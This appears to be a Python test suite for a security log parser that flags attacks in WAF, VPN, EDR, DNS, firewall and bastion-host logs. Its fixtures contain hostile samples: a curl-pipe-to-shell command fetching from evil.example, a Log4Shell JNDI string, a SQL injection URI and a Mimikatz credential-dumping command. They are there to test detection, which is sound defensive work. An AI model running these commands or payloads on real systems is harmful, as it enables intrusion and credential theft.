from _support import *


class P0SecurityRegressionTests(unittest.TestCase):
    def test_p0_waf_csv_detects_web_attack(self):
        content = (
            "time,src_ip,host,method,uri,action,rule_id,attack_type,status,user_agent\n"
            "2024-03-15 10:00:00,203.0.113.8,www.example.com,GET,"
            "\"/login?id=1 UNION SELECT NULL--\",block,942100,SQL Injection,403,sqlmap\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "waf.csv", parser_hint="csv")

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.category, "Web攻击")
        self.assertEqual(event.rule_name, "SQL注入")
        self.assertIn("web-attack", event.tags)
        self.assertIn("waf", event.tags)

    def test_p0_vpn_jsonl_feeds_brute_force_detection(self):
        lines = [
            _json.dumps({
                "log_type": "vpn",
                "time": f"2024-03-15 10:00:{i:02d}",
                "user": "alice",
                "src_ip": "8.8.4.4",
                "result": "failed",
                "reason": "bad password",
            })
            for i in range(5)
        ]

        result = parse_p0_security_lines(lines, "vpn.jsonl")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 5)
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_p0_bastion_key_value_detects_risky_command(self):
        line = (
            'time="2024-03-15 10:01:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 '
            'command="curl http://evil.example/a.sh | sh" result=success'
        )

        result = parse_p0_security_lines([line], "bastion.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "堡垒机高危命令")
        self.assertIn("bastion-command", result.events[0].tags)
        self.assertEqual(result.events[0].host, "10.0.0.5")

    def test_p0_dns_key_value_detects_tunnel_like_query(self):
        line = (
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR"
        )

        result = parse_p0_security_lines([line], "dns.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "DNS 隧道/高熵域名")
        self.assertIn("dns-tunnel", result.events[0].tags)

    def test_p0_firewall_csv_detects_allowed_sensitive_port(self):
        content = (
            "time,src_ip,dst_ip,dst_port,action,protocol\n"
            "2024-03-15 10:03:00,203.0.113.9,10.0.0.9,3389,allow,tcp\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "firewall.csv", parser_hint="csv")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "防火墙放行敏感端口访问")
        self.assertIn("firewall", result.events[0].tags)
        self.assertEqual(result.events[0].port, 3389)

    def test_p0_firewall_missing_action_is_not_reported_as_allowed(self):
        line = "time=2024-03-15T10:03:00 log_type=firewall src_ip=203.0.113.9 dst_ip=10.0.0.9 dst_port=3389"

        result = parse_p0_security_lines([line], "firewall.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "防火墙敏感端口访问（动作未知）")
        self.assertEqual(result.events[0].level, ThreatLevel.MEDIUM)
        self.assertNotIn("exposed-service", result.events[0].tags)
        self.assertIn("unknown-action", result.events[0].tags)

    def test_p0_vpn_ambiguous_auth_event_is_not_successful_login(self):
        line = _json.dumps({
            "log_type": "vpn",
            "time": "2024-03-15 10:00:00",
            "user": "alice",
            "src_ip": "198.51.100.44",
            "event": "mfa challenge",
            "message": "用户登录进入 MFA 验证",
        })

        result = parse_p0_security_lines([line], "vpn.jsonl")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "VPN 认证事件")
        self.assertIn("auth-observed", result.events[0].tags)
        self.assertNotIn("successful-login", result.events[0].tags)

    def test_p0_pretty_json_object_and_jsonl_both_parse(self):
        pretty = _json.dumps({
            "log_type": "edr",
            "time": "2024-03-15 10:04:00",
            "host": "win-01",
            "severity": "critical",
            "alert": "Mimikatz credential dumping",
        }, ensure_ascii=False, indent=2)
        jsonl = "\n".join([
            _json.dumps({"log_type": "vpn", "time": "2024-03-15 10:00:00", "user": "alice", "src_ip": "198.51.100.44", "result": "failed"}),
            _json.dumps({"log_type": "vpn", "time": "2024-03-15 10:00:01", "user": "alice", "src_ip": "198.51.100.44", "result": "failed"}),
        ])

        pretty_result = parse_content(pretty, "edr.json", parser_name="p0-security")
        jsonl_result = parse_content(jsonl, "vpn.jsonl", parser_name="p0-security")

        self.assertEqual(len(pretty_result.events), 1)
        self.assertEqual(pretty_result.events[0].source, "EDR/XDR")
        self.assertEqual(len(jsonl_result.events), 2)
        self.assertTrue(all("failed-login" in event.tags for event in jsonl_result.events))

    def test_p0_invalid_json_records_parse_error(self):
        result = parse_p0_security_json("{not-json", "bad.json")

        self.assertEqual(result.events, [])
        self.assertEqual(result.stats.parse_errors, 1)

    def test_p0_edr_json_detects_credential_dumping(self):
        content = _json.dumps([{
            "log_type": "edr",
            "time": "2024-03-15 10:04:00",
            "host": "win-01",
            "user": "bob",
            "severity": "critical",
            "alert": "Mimikatz credential dumping",
            "process": "mimikatz.exe",
            "commandline": "sekurlsa::logonpasswords",
        }])

        result = parse_p0_security_json(content, "edr.json")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].level, ThreatLevel.CRITICAL)
        self.assertIn("malware-indicator", result.events[0].tags)
        self.assertIn("lsass-dump", result.events[0].tags)

    def test_p0_json_array_file_streams_records(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "vpn.json"
            path.write_text(
                _json.dumps([
                    {
                        "log_type": "vpn",
                        "time": "2024-03-15 10:00:00",
                        "user": "alice",
                        "src_ip": "198.51.100.44",
                        "result": "failed",
                    },
                    {
                        "log_type": "vpn",
                        "time": "2024-03-15 10:00:01",
                        "user": "alice",
                        "src_ip": "198.51.100.44",
                        "result": "failed",
                    },
                ]),
                encoding="utf-8",
            )
            result = parse_p0_security_json_file(str(path), path.name)

        self.assertEqual(len(result.events), 2)
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertGreater(result.file_size_bytes, 0)

    def test_p0_json_wrapper_records_file_is_supported(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "edr.json"
            path.write_text(
                _json.dumps({
                    "records": [{
                        "log_type": "edr",
                        "time": "2024-03-15 10:04:00",
                        "host": "win-01",
                        "severity": "critical",
                        "alert": "Mimikatz credential dumping",
                    }]
                }),
                encoding="utf-8",
            )
            result = parse_p0_security_json_file(str(path), path.name)

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].source, "EDR/XDR")
        self.assertIn("lsass-dump", result.events[0].tags)

    def test_p0_json_file_keeps_partial_events_and_counts_decode_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "vpn.json"
            path.write_text(
                '['
                '{"log_type":"vpn","time":"2024-03-15 10:00:00","user":"alice","src_ip":"198.51.100.44","result":"failed"},'
                '{"log_type":"vpn","time":"2024-03-15 10:00:01","user":"alice","src_ip":'
                ,
                encoding="utf-8",
            )
            result = parse_p0_security_json_file(str(path), path.name)

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.stats.parse_errors, 1)
        self.assertIn("failed-login", result.events[0].tags)

    def test_p0_adapter_registry_exposes_expected_kinds(self):
        self.assertEqual(
            list_p0_adapter_kinds(),
            ["waf", "vpn", "edr", "dns", "proxy", "firewall", "bastion", "app"],
        )

    def test_auto_parse_p0_application_log_detects_exploit_trace(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "application.log"
            path.write_text(
                "2024-03-15 10:05:00 ERROR request failed: ${jndi:ldap://evil.example/a}\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        self.assertIn("web-attack", result.events[0].tags)

    def test_p0_security_events_are_promoted_to_alerts(self):
        lines = [
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR",
            'time="2024-03-15 10:03:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 command="curl http://evil.example/a.sh | sh"',
            "time=2024-03-15T10:04:00 log_type=firewall src_ip=203.0.113.9 "
            "dst_ip=10.0.0.9 dst_port=3389 action=allow protocol=tcp",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)
        rule_ids = {alert.rule_id for alert in summary.alerts}

        self.assertIn("P0-C2-001", rule_ids)
        self.assertIn("P0-BASTION-001", rule_ids)
        self.assertIn("P0-FW-001", rule_ids)

    def test_p0_events_expose_stable_normalized_fields(self):
        """P0 解析结果必须暴露统一字段，方便后续 enrich/correlation/report 使用。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "hvv_chain.jsonl"
        result = parse_p0_security_lines(path.read_text(encoding="utf-8").splitlines(), path.name)
        fields = (
            "source_type", "src_ip", "dst_ip", "asset", "account", "action",
            "status", "url", "command", "process", "bytes_out", "session_id", "trace_id",
        )

        self.assertEqual(len(result.events), 6)
        for event in result.events:
            for field in fields:
                self.assertIn(field, event.details)

        summary = run_detection(result.events, profile="cn-hvv")
        enriched = summary.timeline[0]
        self.assertIsNotNone(enriched)
        self.assertTrue(all("event_family" in event.details for event in result.events))
        self.assertTrue(all("asset_role" in event.details for event in result.events))

    def test_p0_hvv_chain_matches_golden_incident(self):
        """同一批 P0 样本的告警与 incident 结果必须稳定。"""
        reset_counter()
        base = Path(__file__).parent / "fixtures" / "p0"
        golden = _json.loads((base / "golden_hvv_chain.json").read_text(encoding="utf-8"))
        result = auto_parse(str(base / "hvv_chain.jsonl"))
        summary = run_detection(result.events, profile=golden["profile"])

        self.assertEqual(summary.total_events, golden["total_events"])
        self.assertEqual(sorted({alert.rule_id for alert in summary.alerts}), golden["alert_rule_ids"])
        self.assertEqual(len(summary.incidents), golden["incident_count"])
        top = summary.incidents[0]
        self.assertEqual(top.level.value, golden["top_incident"]["level"])
        self.assertEqual(top.confidence, golden["top_incident"]["confidence"])
        self.assertEqual(top.source_types, golden["top_incident"]["source_types"])
        self.assertEqual(top.attack_phases, golden["top_incident"]["attack_phases"])
        self.assertGreaterEqual(len(top.timeline), 4)
        self.assertTrue(top.next_logs)
        chain = {item.phase: item for item in summary.attack_chain}
        self.assertEqual(chain["初始访问"].event_count, 2)
        self.assertEqual(chain["主机失陷"].event_count, 1)
        self.assertEqual(chain["命令控制"].event_count, 2)
        self.assertEqual(chain["数据外传"].event_count, 1)
        self.assertNotIn("执行", chain)
        edr_alert = next(alert for alert in summary.alerts if alert.rule_id == "P0-EDR-001")
        self.assertEqual(edr_alert.mitre_attack, "T1505.003")
        self.assertEqual(edr_alert.mitre_phase, "主机失陷")

    def test_p0_benign_noise_does_not_create_high_risk_incident(self):
        """健康检查、正常堡垒机命令、少量 VPN 输错密码不应升级为案件。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "benign_noise.jsonl"
        result = auto_parse(str(path))
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertEqual(len(summary.alerts), 0)
        self.assertEqual(len(summary.incidents), 0)
